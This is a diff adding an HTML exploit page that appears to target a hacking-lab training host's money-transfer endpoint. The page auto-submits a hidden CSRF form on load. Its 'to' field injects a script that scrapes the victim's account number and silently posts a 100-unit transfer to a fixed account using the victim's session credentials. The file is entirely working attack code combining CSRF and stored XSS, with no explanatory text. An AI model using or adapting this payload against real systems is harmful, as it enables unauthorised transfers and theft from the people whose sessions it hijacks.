@@ -1,0 +1,22 @@
+<html>
+<body onload='document.CSRF.submit()'>
+<form action='https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/transfer' method='POST' name='CSRF'>
+    <input type='hidden' name='from' value='DC57C6B34ACC1AF505CB'>
+    <!--input type='hidden' name='to' value='<script>alert("alert");</script>'-->
+    <input type='hidden' name='to' value='asdASDF<script>
+        (async() =>{
+            let text  = await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/").then((r) => r.text());
+            let regex = /([0-9A-F]{20})/;
+            let srcAccount = regex.exec(text)[0];
+            console.log("Account: " + srcAccount);
+            let formData = new FormData();
+            formData.append("from", srcAccount);
+            formData.append("to", "DC57C6B34ACC1AF505CB");
+            formData.append("amount", "100");
+            await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/transfer", {"method": "POST", "body": formData, "credentials": "include"});
+        })();
+        </script>'>
+    <input type='hidden' name='amount' value='100'>
+</form>
+</body>
+</html>
